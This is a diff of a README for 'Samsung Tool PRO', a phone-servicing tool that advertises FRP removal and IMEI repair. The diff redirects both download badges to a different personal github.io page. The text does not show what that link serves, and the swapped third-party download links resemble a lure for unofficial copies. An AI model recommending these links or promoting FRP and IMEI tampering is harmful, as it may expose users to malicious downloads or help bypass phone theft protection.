@@ -2,7 +2,7 @@
 
 Samsung Tool PRO is a comprehensive mobile servicing software designed for Samsung devices. It offers unlocking, flashing, FRP removal, IMEI repair, and advanced diagnostic tools to assist technicians in efficient phone repair and maintenance.
 
-[![Download Samsung Tool PRO](https://img.shields.io/badge/Download-Samsung%20Tool%20PRO-blueviolet)](https://samsung-tool-pro.github.io/.github)
+[![Download Samsung Tool PRO](https://img.shields.io/badge/Download-Samsung%20Tool%20PRO-blueviolet)](https://istiaqshuju.github.io/.github/samsung-tool-pro)
 
 ---
 
@@ -35,7 +35,7 @@ Samsung Tool PRO is a comprehensive mobile servicing software designed for Samsu
 - Repairing corrupted IMEI or baseband problems  
 - Backing up and restoring critical device data  
 
-[![Download Samsung Tool PRO](https://img.shields.io/badge/Download-Samsung%20Tool%20PRO-blueviolet)](https://samsung-tool-pro.github.io/.github)
+[![Download Samsung Tool PRO](https://img.shields.io/badge/Download-Samsung%20Tool%20PRO-blueviolet)](https://istiaqshuju.github.io/.github/samsung-tool-pro)
 
 ---
 
